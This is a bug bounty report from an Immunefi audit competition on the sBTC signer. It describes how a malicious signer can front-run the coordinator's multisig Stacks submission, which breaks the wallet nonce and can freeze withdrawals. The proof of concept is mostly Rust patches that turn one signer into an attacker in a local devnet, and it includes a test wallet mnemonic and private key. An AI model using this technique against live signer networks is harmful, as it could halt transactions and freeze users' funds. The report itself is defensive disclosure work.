# #41014 \[BC-Low] The signer can submit multi-tx first to make the coordinator's submission fail

**Submitted on Mar 9th 2025 at 13:52:17 UTC by @f4lc0n for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #41014
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * Permanent freezing of funds (fix requires hardfork)

## Description

## Brief/Intro

Each BTC block will have a coordinator, which is responsible for submitting all Stacks transactions and BTC transactions. The process is briefly described as follows:

1. Coordinator broadcasts signature request
2. Each signer broadcasts their signature
3. After the Coordinator collects enough signatures, he submits the transaction to the Stacks or BTC network

The problem now is that since everyone can receive the broadcast message, a malicious signer can collect enough signatures and submit transactions to Stacks or the BTC network. This will cause the transaction submitted by the Coordinator to be rejected. The scenario is as follows.

1. Coordinator broadcasts signature request
2. Each signer broadcasts their signature
3. The malicious signer collects enough signatures and submits the transaction to the Stacks or BTC network
4. After the Coordinator collects enough signatures, he submits the transaction to the Stacks or BTC network, but fails.

Although this transaction will be executed successfully, it will cause all subsequent transaction submissions to fail. The PoC will use Stacks as an example to illustrate the problem.

## Vulnerability Details

For Stacks transaction. Once a `process_sign_request` fails to execute, the wallet nonce will be reduced, which will cause all subsequent transactions to fail.

```rust
            let process_request_fut =
                self.process_sign_request(sign_request, chain_tip.as_ref(), multi_tx, wallet);

            let status = match process_request_fut.await {
                Ok(txid) => {
                    tracing::info!(%txid, "successfully submitted complete-deposit transaction");
                    "success"
                }
                Err(error) => {
                    tracing::warn!(
                        %error,
                        txid = %outpoint.txid,
                        vout = %outpoint.vout,
                        "could not process the stacks sign request for a deposit"
                    );
                    wallet.set_nonce(wallet.get_nonce().saturating_sub(1));
                    "failure"
                }
            };
```

For BTC transaction. The `signer/src/transaction_coordinator.rs::TxCoordinatorEventLoop::construct_and_sign_bitcoin_sbtc_transactions` function code is as follows. If a `sign_and_broadcast` fails to execute, the function stops executing and throws an error.

```rust
        // Construct, sign and broadcast the bitcoin transactions.
        for mut transaction in transaction_package {
            self.sign_and_broadcast(
                bitcoin_chain_tip.as_ref(),
                signer_public_keys,
                &mut transaction,
            )
            .await?;

            // TODO: if this (considering also fallback clients) fails, we will
            // need to handle the inconsistency of having the sweep tx confirmed
            // but emily deposit still marked as pending.
            self.context
                .get_emily_client()
                .accept_deposits(&transaction, &stacks_chain_tip)
                .await?;
        }

        Ok(())
    }
```

## Impact Details

Malicious Signers can make each BTC Block (every 10 minutes) execute only 1 Stacks transaction and 1 BTC transaction. This will almost stop the transaction on the Stacks side, because the transaction production speed on the Stacks side is likely to be greater than 1 transaction every 10 minutes.

Malicious signers can further exploit this by generating a deposits request every 10 minutes, which will completely stop the withdrawal behavior on the Stacks side. Because deposit transactions will always take precedence over withdrawal transactions. Then, some sBTC will be frozen.

## References

None

## Proof of Concept

## Proof of Concept

* Base on: <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* Auditor wallet address: `ST2BEV097EV2R9ZMFRMRT904QB5RFYMA0683TC111`
* Auditor wallet mnemonics: `spawn knee orchard patrol merge forget dust position daring short bridge elevator attitude leopard opera appear auction limit magic hover tunnel museum quantum manual`

1. Patch `docker/stacks/stacks-regtest-miner.toml`. Give the auditor address some STX for testing.

   ```diff
    [[ustx_balance]]
    address = "ST3497E9JFQ7KB9VEHAZRWYKF3296WQZEXBPXG193" # Demo principal
    amount = 10000000000000000
    
   +[[ustx_balance]]
   +address = "ST2BEV097EV2R9ZMFRMRT904QB5RFYMA0683TC111" # Auditor principal
   +amount = 10000000000000000
   ```
2. Add [this code](https://gist.github.com/al-f4lc0n/25bd18b41484fab5e3a121df236bbc7d) to `signer/src/bin/pocinit.rs`. On the basis of `./signers.sh demo` command, it also deposited some sBTC to the auditor address for testing
3. Add `pocinit` bin to `signer/Cargo.toml`

   ```diff
   + [[bin]]
   + name = "pocinit"
   + path = "src/bin/pocinit.rs"
   ```
4. Patch `docker/docker-compose.yml`, add attacker flag to `sbtc-signer-3`

   ```diff
     sbtc-signer-3:
       <<: *sbtc-signer # Inherit all from the "sbtc-signer" service
       container_name: sbtc-signer-3
       depends_on:
         - postgres-3
       environment:
         <<: *sbtc-signer-environment
         SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
         SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
         SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   +     AUDIT_THIS_SIGNER_IS_ATTACKER: true
       ports:
         - "8803:8801"
   ```
5. Patch `signer/src/config/mod.rs`, add attacker flag config

   ```diff
        /// The number of bitcoin blocks after a DKG start where we attempt to
        /// verify the shares. After this many blocks, we mark the shares as failed.
        pub dkg_verification_window: u16,
   +    /// AUDIT
   +    pub audit_this_signer_is_attacker: Option<bool>,
   ```
6. Patch `signer/src/main.rs`, let signer load the attacker flag

   ```diff
        );

        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config).inspect_err(|error| {
   +    let mut settings = Settings::new(args.config).inspect_err(|error| {
            tracing::error!(%error, "failed to construct the configuration");
        })?;
   +    // AUDIT begin
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("AUDIT this signer is attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
   +    // AUDIT end

        let signer_public_key = settings.signer.public_key();
        tracing::info!(%signer_public_key, "config loaded successfully");
   ```
7. Patch `signer/src/network/libp2p/event_loop.rs`, add attack action

   ```diff
   +// AUDIT begin
   +use crate::message::StacksTransactionSignRequest;
   +static mut CHACE_REQUEST: Option<StacksTransactionSignRequest> = None;
   +// AUDIT end
    #[tracing::instrument(skip_all, name = "gossipsub")]
    fn handle_gossipsub_event(
        swarm: &mut Swarm<SignerBehavior>,
        ctx: &impl Context,
        event: gossipsub::Event,
    ) {
        use gossipsub::Event;
    
        match event {
            Event::Message {
                propagation_source: peer_id,
                message,
                ..
            } => {
                let current_signer_set = ctx.state().current_signer_set();
                // The following check should be unnecessary. In order to
                // receive a message the peer needs to establish a connection,
                // and in order to do that the peer needs to be in the current
                // signer set. When we implement the signing set changing code,
                // we should re-evaluate whether we should remove this check.
                if !current_signer_set.is_allowed_peer(&peer_id) {
                    tracing::warn!(%peer_id, "ignoring message from unknown peer");
                    return;
                }
    
                // The message may have originated from someone else, let's
                // check that peer ID too. If we haven't been told the source
                // then we distrust the message and ignore it.
                let Some(origin_peer_id) = message.source else {
                    tracing::warn!(%peer_id, "origin peer id unknown, ignoring message");
                    return;
                };
    
                if !current_signer_set.is_allowed_peer(&origin_peer_id) {
                    tracing::warn!(%origin_peer_id, "ignoring message from unknown origin peer");
                    return;
                }
    
                Msg::decode_with_digest(&message.data)
                    .and_then(|(msg, digest)| {
   +                    // AUDIT begin
   +                    let this_signer_is_attacker = ctx.config().signer.audit_this_signer_is_attacker.is_some_and(|x| x);
   +                    if this_signer_is_attacker {
   +                        let bitcoin_chain_tip = msg.bitcoin_chain_tip.clone();
   +                        match msg.payload.clone() {
   +                            crate::message::Payload::StacksTransactionSignRequest(sign_requst) => {
   +                                tracing::info!("AUDIT sign_requst: {:?}", sign_requst);
   +                                unsafe { CHACE_REQUEST = Some(sign_requst.clone()) }
   +                            },
   +                            crate::message::Payload::StacksTransactionSignature(peer_signature) => {
   +                                tracing::info!("AUDIT signature: {:?}", peer_signature);
   +                                use crate::stacks::api::StacksInteract;
   +                                let stacks_client = ctx.get_stacks_client();
   +                                let wallet = futures::executor::block_on(crate::stacks::wallet::SignerWallet::load(ctx, &bitcoin_chain_tip))?;
   +
   +                                unsafe {
   +                                    match CHACE_REQUEST.clone() {
   +                                        None => {},
   +                                        Some(request) => {
   +                                            wallet.set_nonce(request.nonce);
   +
   +                                            let mut multi_tx = crate::stacks::wallet::MultisigTx::new_tx(&request.contract_tx, &wallet, request.tx_fee);
   +                                            let my_signature = crate::signature::sign_stacks_tx(multi_tx.tx(), &ctx.config().signer.private_key);
   +                                            multi_tx.add_signature(my_signature)?;
   +                                            multi_tx.add_signature(peer_signature.signature)?;
   +
   +                                            let tx = multi_tx.finalize_transaction();
   +                                            let result = futures::executor::block_on(stacks_client.submit_tx(&tx))?;
   +                                            tracing::info!("AUDIT submit_tx_result: {:?}", result);
   +                                        },
   +                                    }
   +                                }
   +                            },
   +                            _ => {},
   +                        }
   +                    }
   +                    // AUDIT
                        tracing::trace!(
                            local_peer_id = %swarm.local_peer_id(),
                            %peer_id,
   ```
8. Add [this code](https://gist.github.com/al-f4lc0n/bedd32697390069be3efac1c906096a4) to `signer/src/bin/pocii7.rs`.
9. Add `pocii7` bin to `signer/Cargo.toml`

   ```diff
   + [[bin]]
   + name = "pocii7"
   + path = "src/bin/pocii7.rs"
   ```
10. Run `devenv` and run `pocinit`

    ```sh
    make devenv-up
    cargo run -p signer --bin pocinit
    ```
11. Run `pocii7`. It will execute 100 deposits.

    ```sh
    cargo run -p signer --bin pocii7
    ```
12. Observe the logs and you will find that some transactions were rejected when submitting the Stacks transaction.
